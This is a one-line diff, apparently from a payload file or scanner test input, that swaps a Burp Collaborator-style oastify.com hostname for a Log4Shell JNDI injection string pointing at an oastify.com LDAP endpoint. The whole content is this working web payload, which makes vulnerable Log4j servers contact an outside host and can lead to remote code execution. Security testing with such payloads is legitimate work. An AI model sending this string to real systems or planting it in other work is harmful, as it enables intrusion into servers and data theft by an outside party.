@@ -1,1 +1,1 @@
-ydf5pb0azzhfhsf022pfxwhi2980wqkf.oastify.com
+${jndi:ldap://ywy0627fev90867q3atjrye88zeq2hq6.oastify.com/a}
